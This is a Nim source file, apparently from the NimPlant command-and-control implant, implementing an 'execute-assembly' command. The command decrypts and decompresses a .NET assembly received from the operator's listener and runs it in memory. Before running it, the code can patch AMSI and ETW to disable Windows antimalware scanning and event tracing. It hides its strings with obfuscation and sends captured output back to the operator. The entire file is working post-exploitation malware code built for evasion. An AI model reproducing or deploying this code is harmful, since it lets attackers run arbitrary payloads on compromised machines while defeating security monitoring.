import winim/clr except `[]`
from strutils import parseInt
from zippy import uncompress
import ../../util/[crypto, patches]

# Execute a dotnet binary from an encrypted and compressed stream
proc executeAssembly*(li : Listener, args : varargs[string]) : string =
    # This shouldn't happen since parameters are managed on the Python-side, but you never know
    if not args.len >= 2:
        result = obf("Invalid number of arguments received. Usage: 'execute-assembly <BYPASSAMSI=0> <BLOCKETW=0> [localfilepath] <arguments>'.")
        return

    let
        assemblyB64: string = args[2]
    var
        amsi: bool = false
        etw: bool = false

    amsi = cast[bool](parseInt(args[0]))
    etw = cast[bool](parseInt(args[1]))

    result = obf("Executing .NET assembly from memory...\n")
    if amsi:
        var res = patchAMSI()
        if res == 0:
            result.add(obf("[+] AMSI patched!\n"))
        if res == 1:
            result.add(obf("[-] Error patching AMSI!\n"))
        if res == 2:
            result.add(obf("[+] AMSI already patched!\n"))
    if etw:
        var res = patchETW()
        if res == 0:
            result.add(obf("[+] ETW patched!\n"))
        if res == 1:
            result.add(obf("[-] Error patching ETW!\n"))
        if res == 2:
            result.add(obf("[+] ETW already patched!\n"))

    var dec = decryptData(assemblyB64, li.cryptKey)
    var decStr: string = cast[string](dec)
    var decompressed: string = uncompress(decStr)

    var assembly = load(convertToByteSeq(decompressed))
    var arr = toCLRVariant(args[3 .. ^1], VT_BSTR)

    result.add(obf("[*] Executing...\n"))
    
    # .NET CLR wizardry to redirect Console.WriteLine output to the nimplant console
    let
        mscor = load(obf("mscorlib"))
        io = load(obf("System.IO"))
        Console = mscor.GetType(obf("System.Console"))
        StringWriter = io.GetType(obf("System.IO.StringWriter"))
    
    var sw = @StringWriter.new()
    var oldConsOut = @Console.Out
    @Console.SetOut(sw)

    # Actual assembly execution
    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

    # Restore console properties so we don't break anything, and return captured output
    @Console.SetOut(oldConsOut)
    var res = fromCLRVariant[string](sw.ToString())
    result.add(res)

    result.add(obf("[+] Execution completed."))